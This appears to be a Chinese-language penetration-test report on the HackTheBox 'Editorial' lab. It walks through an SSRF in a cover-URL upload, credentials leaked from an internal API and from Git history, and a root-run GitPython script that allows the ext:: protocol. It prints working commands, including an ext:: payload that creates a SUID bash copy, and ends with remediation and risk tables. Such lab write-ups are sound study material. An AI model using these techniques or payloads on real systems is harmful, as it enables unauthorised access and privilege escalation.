id="d1c22514-0e9c-420c-9af0-fb01b95ac95a" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">seq 1 10000 &gt; ports.txt
+ffuf -request request.txt -request-proto http -w ports.txt -ac</code></pre><p id="1a15dfb7-a070-4a64-9561-47fa02b60750" class="" dir="auto">E-01 原始結果摘錄：</p><pre id="66c08182-5120-4a76-882a-75bd0f1016d6" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">5000 [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 232ms]</code></pre><p id="9764ca00-2093-408c-9c94-7e25bc39dc34" class="" dir="auto">5000 的回應提供 static/uploads 路徑。測試者進一步下載該路徑，讀到內部 API JSON，才確認回應來自後端存取的內部服務，而非僅依 HTTP 200 判定成功。</p><h2 id="4e2261c2-a437-4dd0-af25-003f586a8d2b" class="" dir="auto">05 Findings &amp; Exploitation 漏洞發現、利用證據與基本修補方向</h2><h3 id="30dd9933-4f4c-4a0b-92fe-6f323cde5e67" class="" dir="auto">F-01 封面 URL 造成 SSRF 與內部 API 回應外洩</h3><p id="75caa4c6-8de5-4118-94cf-7d8655b617e8" class="" dir="auto">風險：高。<br/>受影響項目：POST /upload-cover 的 bookurl。<br/>前提：外部請求可提交封面 URL，後端接受 loopback 目的地。</p><p id="d27127de-5e35-40f2-97eb-784a1469b852" class="" dir="auto">測試將 bookurl 指向 <code>http://127.0.0.1:5000</code>，後端回傳：</p><pre id="659a7299-f633-4f42-858e-13b550691933" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">HTTP/1.1 200 OK
+Content-Length: 51
+
+static/uploads/edbde4b8-1cad-4af1-9210-b9fd84604135</code></pre><p id="62d846e8-9aee-4d3b-a886-00280806f8d1" class="" dir="auto">接著讀取後端保存的回應。以下為原始 curl 與 JSON 的節錄，省略未影響判讀的項目：</p><pre id="23f33bd2-81b1-42f7-b50d-3a00dbb35911" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">curl http://editorial.htb/static/uploads/dce88907-d34d-4546-8cef-20a27d8dac7b -s | jq .</code></pre><pre id="18515fc1-90da-413a-a343-0e6227043926" class="code code-wrap" data-notion-code-syntax="json"><code class="language-json" style="white-space:pre-wrap;word-break:break-all">{
+  &quot;messages&quot;: [
+    {
+      &quot;new_authors&quot;: {
+        &quot;description&quot;: &quot;Retrieve the welcome message sended to our new authors.&quot;,
+        &quot;endpoint&quot;: &quot;/api/latest/metadata/messages/authors&quot;,
+        &quot;methods&quot;: &quot;GET&quot;
+      }
+    }
+  ]
+}</code></pre><p id="0635aa0d-a407-4e76-ae8e-968a8dff4cc7" class="" dir="auto">E-02：內部 API 目錄 JSON 與 static/uploads 讀取結果。原始紀錄中的兩次請求產生不同檔案識別碼，報告保留原值，未將兩者拼成同一次 HTTP 交易。</p><p id="cd307b26-d987-47ca-80eb-d8c49ec0fa68" class="" dir="auto">影響：外部訪客透過應用接觸伺服器本機 HTTP 服務，並讀取其內容。此為有回應內容的 SSRF，內部 API 的憑證問題另列 F-02。</p><h3 id="58428a40-d155-4816-a4a2-80dc74cb6d22" class="" dir="auto">F-02 內部 API 回傳有效的 dev 明文憑證</h3><p id="e4ecb095-5d9a-45cc-abfd-f35c3780f2a9" class="" dir="auto">風險：高。<br/>受影響項目：/api/latest/metadata/messages/authors。<br/>前提：透過 F-01 接觸內部 API。</p><p id="8075416e-d385-4ea9-baff-ed8a3e4b727a" class="" dir="auto">測試者將 bookurl 改為：</p><pre id="15a13c12-ca57-4be2-812f-1acec2cf0903" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">http://127.0.0.1:5000/api/latest/metadata/messages/authors</code></pre><p id="f5045b19-927f-44c4-b487-f20373ea6e9b" class="" dir="auto">後端回傳 static/uploads/8bb8b2c1-1fe1-4ac4-aff1-5e43120e36c4。讀取該檔案後，template_mail_message 包含：</p><pre id="027a36df-fe34-4665-8dc1-be35c57f9a56" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">Your login credentials for our internal forum and authors site are:
+Username: dev
+Password: [REDACTED]</code></pre><p id="e34c8509-b02d-4f38-abb3-0dd92be3baf9" class="" dir="auto">原筆記記載 SSH 登入成功，並保留登入後的身分輸出：</p><pre id="c1b5e81d-53f6-44b1-b99b-44ab9d33b353" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">dev@editorial:~$ id
+uid=1001(dev) gid=1001(dev) groups=1001(dev)
+dev@editorial:~$ whoami
+dev
+dev@editorial:~$ sudo -l
+Sorry, user dev may not run sudo on editorial.</code></pre><p id="eb131ece-3a92-45b6-81f4-3e148fab89de" class="" dir="auto">E-03：API 憑證回應與 dev 的 id、whoami 結果。<br/>影響：API 中原本聲稱供內部論壇與作者網站登入的密碼，也獲主機 SSH 接受，讓 Web 資料外洩延伸至系統存取。dev 未獲 sudo 授權，不能將初始登入視為管理員權限。</p><h3 id="83d001ac-1891-4238-85ac-a7d916a25202" class="" dir="auto">F-03 Git 提交歷史保留有效的 prod 憑證</h3><p id="a9dd670d-c6b1-48f4-a417-39bd1753d056" class="" dir="auto">風險：高。<br/>受影響項目：/home/dev/apps/.git 與 <code>app_api/app.py</code> 的提交歷史。<br/>前提：已取得 dev 帳號，且該帳號可讀取本機儲存庫。</p><p id="89dd426d-81bc-43b8-979b-84207110383e" class="" dir="auto">dev 家目錄的 apps 下保留 .git，測試者檢查提交歷史：</p><pre id="67bd7596-5fe7-44c8-abdd-e2beb63ddf17" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">git log --oneline
+git show b73481b</code></pre><p id="a0c67779-69d1-45a0-8084-0236ef412e01" class="" dir="auto">E-04 原始歷史摘錄：</p><pre id="4a1107bc-9983-4f1c-a218-89f4a663c742" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">8ad0f31 fix: bugfix in api port endpoint
+dfef9f2 change: remove debug and update api port
+b73481b change(api): downgrading prod to dev
+1e84a03 feat: create api to editorial info
+3251ec9 feat: create editorial app</code></pre><p id="edd580d6-a0c1-422f-b3db-422e3e0ce287" class="" dir="auto">b73481b 的 diff 顯示寄信模板從 prod 改為 dev，刪除行仍保留先前的 prod 帳密。遮罩後的內容摘要：</p><pre id="055b5f9a-b794-4c5f-9330-dbfc6bca6f95" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">Removed template credentials:
+Username: prod
+Password: [REDACTED]
+
+Replacement template credentials:
+Username: dev
+Password: [REDACTED]</code></pre><p id="4afe83e9-e4ee-4b9e-891f-9674ce581a20" class="" dir="auto">取得 prod 密碼後，原筆記記載再次 SSH 登入成功，身分結果為：</p><pre id="a7af82ad-c3b8-48ed-85ab-5808a15144d4" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">prod@editorial:/tmp$ id
+uid=1000(prod) gid=1000(prod) groups=1000(prod)
+prod@editorial:/tmp$ whoami
+prod</code></pre><p id="1174c4b6-f010-4f35-bb6f-89aeafc5532b" class="" dir="auto">影響：即使現行程式已換掉帳號，Git 歷史仍保有有效的舊憑證，導致從 dev 切換至具有 sudo 權限的 prod。<br/>判讀邊界：此處是登入後讀取本機 .git，未驗證網站對外暴露 /.git。原始 Git diff 截圖含明文密碼，本版採遮罩文字，未搬入該圖。</p><h3 id="58fce678-33a5-464f-9a08-cfe31aa389bc" class="" dir="auto">F-04 root 複製腳本接受外部 URL 並啟用 Git ext 協定</h3><p id="29ef6a89-54ac-4663-aaad-23a0d7821958" class="" dir="auto">風險：嚴重，依 sudo 授權、可控 URL 與 <code>protocol.ext.allow=always</code> 的組合評估。此評級描述設定形成的風險，不代表已驗證 Root Shell。<br/>受影響項目：sudo 規則、<code>/opt/internal_apps/clone_changes/clone_prod_change.py</code>。<br/>前提：已取得 prod 身分，具指定腳本的 sudo 授權。</p><p id="587599c4-70d1-40d2-947c-1e39432e722f" class="" dir="auto">E-05 原始 sudo 輸出：</p><pre id="c68af8d4-7401-4c6a-a730-76170e0f5575" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">User prod may run the following commands on editorial:
+    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *</code></pre><p id="eb7b0aaf-b67f-46b7-915e-b341bf2d3be4" class="" dir="auto">腳本內容：</p><pre id="749363cb-37d9-47a8-9bf3-76ac5a68a3b0" class="code code-wrap" data-notion-code-syntax="python"><code class="language-python" style="white-space:pre-wrap;word-break:break-all">#!/usr/bin/python3
+import os
+import sys
+from git import Repo
+
+os.chdir(&#x27;/opt/internal_apps/clone_changes&#x27;)
+url_to_clone = sys.argv[1]
+r = Repo.init(&#x27;&#x27;, bare=True)
+r.clone_from(
+    url_to_clone,
+    &#x27;new_changes&#x27;,
+    multi_options=[&quot;-c protocol.ext.allow=always&quot;]
+)</code></pre><p id="f33545f6-276f-4867-b533-63841b09461a" class="" dir="auto">版本查詢回傳 GitPython 3.1.29：</p><pre id="de4c03f6-5580-4e68-a732-52932c4b0f53" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">python3 -c &quot;import git; print(git.__version__)&quot;</code></pre><p id="253c5a5e-62a2-4f46-943d-9bdfc1595d29" class="" dir="auto">測試者將 ext:: URL 傳入以 root 執行的腳本，目標是透過 shell 建立 /tmp/rootbash，再以 -p 保留有效身分。原始嘗試如下，並非經本報告重新驗證的成功指令：</p><pre id="048bf58f-fb8e-4d1c-990e-629d38fc6e97" class="code code-wrap" data-notion-code-syntax="bash"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py &#x27;ext::sh -c cp${IFS}/bin/bash${IFS}/tmp/rootbash;chmod${IFS}+s${IFS}/tmp/rootbash&#x27;
+/tmp/rootbash -p</code></pre><p id="a7b17514-241d-46dd-b319-baaaf30818e7" class="" dir="auto">原始執行結果摘錄：</p><pre id="b2b9ab60-de62-4236-af94-f5e64298d7b7" class="code code-wrap"><code style="white-space:pre-wrap;word-break:break-all">git.exc.GitCommandError: Cmd(&#x27;git&#x27;) failed due to: exit code(128)
+fatal: Could not read from remote repository.</code></pre><p id="bc359565-d4a7-47ea-98ff-d0e5b01a9fb6" class="" dir="auto">E-06：ext:: 利用嘗試、Git clone 錯誤與後續 /tmp/rootbash -p 指令。</p><p id="7da11f8b-6434-40c9-9df5-f7d7644e8a0a" class="" dir="auto">判讀：腳本接受呼叫者提供的 URL，明確允許 ext 協定，並在 sudo 的 root 權限下呼叫 Git，形成外部輸入進入高權限命令執行流程的風險。版本號是已記錄資訊，本報告未僅憑版本指定 CVE 編號。</p><p id="ac6684c4-e26a-41a7-99cd-e8cc83571eea" class="" dir="auto">證據邊界：Git clone 錯誤不等同於完全沒有副作用，也不代表利用成功。現有筆記缺少 /tmp/rootbash 的擁有者、SUID 權限及執行後的 id 或 whoami，故未確認 root Shell 或 root.txt 讀取。原筆記對指令的概念解釋，不取代成功輸出。</p><h3 id="779bb6db-ca83-4e6e-bdd8-c0709d2bcb60" class="" dir="auto">5.5 基本修補方向</h3><table id="dee75465-ff9c-40de-bbe1-5335cc66a86d" class="simple-table" dir="ltr"><thead class="simple-table-header"><tr id="3f520b9d-ee72-46a7-bfcb-7235257f9b67" dir="ltr"><th id="tBYO" class="simple-table-header-color simple-table-header">Finding ID</th><th id="ljI?" class="simple-table-header-color simple-table-header">弱點原因</th><th id="pFn&gt;" class="simple-table-header-color simple-table-header">建議修補方向</th></tr></thead><tbody><tr id="ac474623-931c-4f01-ad44-7eb68105b62c" dir="ltr"><td id="tBYO" class="">F-01</td><td id="ljI?" class="">後端接受 loopback URL，並保存非圖片的內部回應</td><td id="pFn&gt;" class="">限制目的地主機與協定，阻擋本機及內網目的地，驗證重新導向與回應內容</td></tr><tr id="3d09b01f-ff5b-4165-911f-64c7bf2631e2" dir="ltr"><td id="tBYO" class="">F-02</td><td id="ljI?" class="">內部 API 模板包含有效密碼，憑證也獲 SSH 接受</td><td id="pFn&gt;" class="">移除模板中的密碼、輪替外洩憑證，分離應用與系統登入憑證</td></tr><tr id="f4c6761d-7e34-4149-a00e-ef39c7ff35b9" dir="ltr"><td id="tBYO" class="">F-03</td><td id="ljI?" class="">Git 歷史保留仍有效的帳密</td><td id="pFn&gt;" class="">輪替 prod 憑證，清理受控歷史與副本，加入提交前秘密掃描</td></tr><tr id="59fe7483-6109-43e3-9529-23a4a104f070" dir="ltr"><td id="tBYO" class="">F-04</td><td id="ljI?" class="">root 腳本接受任意 URL 並啟用 ext 協定</td><td id="pFn&gt;" class="">移除非必要 sudo 授權，以低權限帳號執行，停用 ext 並限制儲存庫來源</td></tr></tbody></table><p id="92231a51-d41c-452f-b20f-c6e51cc23d86" class="" dir="auto">以上為基本修補方向，未宣稱完成企業修復或驗收。移除現行程式中的密碼不會自動清除 Git 歷史，也不會讓已外洩憑證失效。</p><p id="14f14230-1ee5-43bf-8321-663b668a3005" class="" dir="auto">證據狀態：E-01 至 E-06 保留原始操作紀錄與相關執行結果，並附封面介面及 Burp 請求原始截圖。F-04 的 root 最終身分尚未由現有紀錄確認。公開內容遮罩密碼，不公開 Flag。</p><h2 id="485589df-0a32-421f-8c3a-0c23bf86956e" class="" dir="auto">06 Risk Assessment 風險評估</h2><table id="385d62d2-d705-4b03-8a1a-d11d94b28a09" class="simple-table" dir="ltr"><thead class="simple-table-header"><tr id="b4cc8c2f-2a2e-4bd4-83a8-9425b99cfb4a" dir="ltr"><th id="MRXh" class="simple-table-header-color simple-table-header">Finding ID</th><th id="^ab\" class="simple-table-header-color simple-table-header">風險等級</th><th id="JVgY" class="simple-table-header-color simple-table-header">已驗證影響或證據界線</th><th id="]a}n" class="simple-table-header-color simple-table-header">修補優先順序</th></tr></thead><tbody><tr id="abb4c69f-94a2-4e95-bef8-213125447811" dir="ltr"><td id="MRXh" class="">F-01</td><td id="^ab\" class="">高</td><td id="JVgY" class="">外部請求讀取 127.0.0.1:5000 的 API 內容</td><td id="]a}n" class="">P1，阻斷內部請求</td></tr><tr id="909f715c-7d72-4957-a95e-777f4375e338" dir="ltr"><td id="MRXh" class="">F-02</td><td id="^ab\" class="">高</td><td id="JVgY" class="">dev 明文憑證外洩，SSH 登入成功</td><td id="]a}n" class="">P1，輪替憑證</td></tr><tr id="e154291f-90bc-4e22-81cd-1ce5409b17f8" dir="ltr"><td id="MRXh" class="">F-03</td><td id="^ab\" class="">高</td><td id="JVgY" class="">歷史 prod 憑證仍有效，取得 prod 帳號</td><td id="]a}n" class="">P1，處理歷史秘密</td></tr><tr id="a5a55b12-e7cb-4c33-86a3-8d621a32346d" dir="ltr"><td id="MRXh" class="">F-04</td><td id="^ab\" class="">嚴重</td><td id="JVgY" class="">確認 root 腳本與 ext 協定設定，已記錄利用嘗試，root 成果未確認</td><td id="]a}n" class="">P1，縮減高權限執行面</td></tr></tbody></table><p id="34882097-cadd-43e6-bbec-1cbcfa47c5f2" class="" dir="auto">整體風險評為嚴重，依據為外部 Web 輸入串連至有效系統憑證與高權限腳本的攻擊條件。已確認 dev 與 prod 存取，root 層級影響以設定風險呈現，未當作已驗證結果。未測試服務中斷，亦未計算正式 CVSS 分數。</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
